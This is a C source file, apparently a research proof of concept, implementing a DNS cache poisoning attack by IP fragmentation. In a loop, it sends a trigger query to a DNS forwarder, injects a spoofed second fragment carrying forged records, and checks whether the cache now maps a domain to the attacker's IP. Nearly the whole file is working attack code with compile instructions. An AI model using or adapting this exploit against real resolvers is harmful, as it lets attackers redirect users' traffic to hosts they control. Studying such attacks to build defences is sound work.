// ======== attack_standalone.c ========
/*
    A standalone C implementation of the IP fragment cache poisoning attack,
    mirroring the logic of the Python PoC (attack.py).

    This version does NOT use the sender framework. It operates in a simple,
    sequential loop to:
    1. Trigger a DNS query.
    2. Immediately send a single, spoofed IP fragment (the second one).
    3. Verify if the cache was poisoned.

    To compile, link with all other necessary .c files from the project:
    gcc -o attack_standalone attack_standalone.c fake.c network.c dns.c parser.c util.c arena.c -pthread
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>

#include "common.h"
#include "network.h"
#include "dns.h"
#include "fake.h"
#include "parser.h"
#include "util.h"
#include "arena.h"

// --- Configuration (mirrors attack.py) ---
#define FORWARDER_IP "192.168.3.144"
#define UPSTREAM_RESOLVER_IP "192.168.3.135"
#define VICTIM_DOMAIN "example.com"
#define ATTACKER_DOMAIN "a.com"
#define ATTACKER_IP "9.9.9.9"
#define ORIGIN_IP "1.1.1.1"
#define CHAIN_LENGTH 55
#define CHAIN_PREFIX "c"

// --- Timing Configuration ---
#define CYCLE_DELAY_SECONDS 3
#define VERIFICATION_DELAY_SECONDS 3
#define VERIFICATION_TIMEOUT_S 2

// --- Main Attack Logic ---
int main(int argc, char **argv)
{
    // Initialization
    dns_init();
    srand(time(NULL));
    int cycle_count = 0;

    printf("--- Standalone IP Fragment Attack Initialized ---\n");
    printf("Target Forwarder: %s\n", FORWARDER_IP);
    printf("Spoofed Source:   %s\n", UPSTREAM_RESOLVER_IP);
    printf("Victim Domain:    %s\n", VICTIM_DOMAIN);
    printf("Poisoning         '%s' -> '%s'\n", ATTACKER_DOMAIN, ATTACKER_IP);
    printf("--------------------------------------------------\n");

    // Main attack loop
    while (1)
    {
        cycle_count++;
        printf("\n==================== Attack Cycle %d ====================\n", cycle_count);

        // Use a memory arena for the current cycle to simplify memory management
        Arena arena = {0};

        // 1. Generate a unique query name for this cycle
        char qname[256];
        snprintf(qname, sizeof(qname), "12345678.%s", VICTIM_DOMAIN);
        printf("[*] Triggering with query: '%s'\n", qname);

        // 2. Build the full, large, poisoned DNS payload
        // This payload is designed to be fragmented.
        uint8_t *full_poisoned_payload = (uint8_t *)arena_alloc_memory(&arena, LARGE_PKT_MAX_LEN);
        size_t payload_len = build_fake_resp(
            &arena,
            full_poisoned_payload,
            LARGE_PKT_MAX_LEN,
            qname,
            CHAIN_PREFIX,
            VICTIM_DOMAIN,
            ORIGIN_IP,
            ATTACKER_DOMAIN,
            ATTACKER_IP,
            CHAIN_LENGTH);

        if (payload_len == 0)
        {
            fprintf(stderr, "[-] ERROR: Failed to build the fake DNS response. Skipping cycle.\n");
            arena_free(&arena);
            sleep(CYCLE_DELAY_SECONDS);
            continue;
        }
        printf("[DEBUG] Writing C payload to c_payload.bin\n");
        FILE *fp = fopen("c_payload.bin", "wb");
        if (fp) {
            fwrite(full_poisoned_payload, 1, payload_len, fp);
            fclose(fp);
        }

        printf("[+] Fake DNS payload created successfully (%zu bytes).\n", payload_len);

        // 3. Send the trigger query to the forwarder
        int trigger_sockfd = make_sockfd_for_dns(VERIFICATION_TIMEOUT_S);
        if (trigger_sockfd < 0)
        {
            perror("[-] ERROR: Could not create socket for trigger query");
            arena_free(&arena);
            continue;
        }
        struct dns_query *trigger_query[1];
        trigger_query[0] = new_dns_query_a(&arena, qname);
        send_dns_req(&arena, trigger_sockfd, FORWARDER_IP, 53, trigger_query, 1);
        close(trigger_sockfd);
        printf("[+] Trigger query sent to %s:53.\n", FORWARDER_IP);

        // 4. Send ONLY the second fragment of the spoofed response
        int spoof_sockfd = make_sockfd_for_spoof();
        if (spoof_sockfd < 0)
        {
            perror("[-] ERROR: Could not create raw socket for spoofing");
            arena_free(&arena);
            continue;
        }

        // We need to construct the full UDP packet first, so `send_sltd_udp_packet` can fragment it internally.
        uint8_t *full_udp_packet = (uint8_t *)arena_alloc_memory(&arena, LARGE_PKT_MAX_LEN);
        size_t full_udp_packet_len = make_udp_packet(
            full_udp_packet,
            LARGE_PKT_MAX_LEN,
            inet_addr(UPSTREAM_RESOLVER_IP), // Spoofed Source IP
            inet_addr(FORWARDER_IP),         // Target IP
            53,                              // Source Port (DNS server standard)
            12345,                              // Destination Port (DNS forwarder standard)
            full_poisoned_payload,
            payload_len);
        // NOTE: make_udp_packet hardcodes IPID to 1, which matches the python PoC.

        // Specify that we only want to send the second fragment (index 1)
        struct sendres frags_to_send;
        int positions[] = {1}; // 0-indexed, so 1 is the second fragment
        frags_to_send.positions = positions;
        frags_to_send.count = 1;

        printf("[*] Sending poisoned fragment (2nd fragment only) to %s...\n", FORWARDER_IP);
        send_sltd_udp_packet(
            &arena,
            spoof_sockfd,
            full_udp_packet,
            full_udp_packet_len,
            inet_addr(UPSTREAM_RESOLVER_IP),
            inet_addr(FORWARDER_IP),
            53,
            12345,
            &frags_to_send);
        close(spoof_sockfd);
        printf("[+] Poisoned fragment sent.\n");

        // 5. Wait a moment, then verify
        sleep(VERIFICATION_DELAY_SECONDS);
        printf("[*] Verifying cache status for '%s'...\n", ATTACKER_DOMAIN);

        int verify_sockfd = make_sockfd_for_dns(VERIFICATION_TIMEOUT_S);
        if (verify_sockfd < 0)
        {
            perror("[-] ERROR: Could not create socket for verification");
            arena_free(&arena);
            continue;
        }

        // Send verification query
        struct dns_query *verify_query[1];
        verify_query[0] = new_dns_query_a(&arena, ATTACKER_DOMAIN);
        send_dns_req(&arena, verify_sockfd, FORWARDER_IP, 53, verify_query, 1);

        // Receive and parse response
        uint8_t recv_buffer[1024];
        ssize_t n = recvfrom(verify_sockfd, recv_buffer, sizeof(recv_buffer), 0, NULL, NULL);
        close(verify_sockfd);

        bool success = false;
        if (n > 0)
        {
            parsed_dns_packet_t dns_packet;
            if (unpack_dns_packet(&arena, recv_buffer, n, &dns_packet))
            {
                // Check the answer section for our poisoned IP
                for (dns_parsed_rr_t *rr = dns_packet.answers; rr; rr = rr->next)
                {
                    if (rr->rtype == RR_TYPE_A)
                    {
                        char ip_str[INET_ADDRSTRLEN];
                        inet_ntop(AF_INET, rr->rdata, ip_str, INET_ADDRSTRLEN);
                        printf("[?] Received A record: %s -> %s\n", rr->name, ip_str);
                        if (strcmp(ip_str, ATTACKER_IP) == 0)
                        {
                            success = true;
                            break;
                        }
                    }
                }
            }
        }
        else
        {
            printf("[-] Verification query timed out or failed.\n");
        }

        // 6. Report result and exit or loop
        if (success)
        {
            printf("\n\n"
                   "**************************************************\n"
                   "***           [+] SUCCESS! [+]                 ***\n"
                   "*** Cache POISONED for '%s' with IP '%s' ***\n"
                   "**************************************************\n\n",
                   ATTACKER_DOMAIN, ATTACKER_IP);
            arena_free(&arena);
            return 0; // Exit successfully
        }
        else
        {
            printf("[-] Cycle %d finished. Poisoning not successful. Retrying...\n", cycle_count);
        }

        // Clean up memory for the next loop and wait
        arena_free(&arena);
        sleep(CYCLE_DELAY_SECONDS);
    }

    return 1; // Should not be reached
}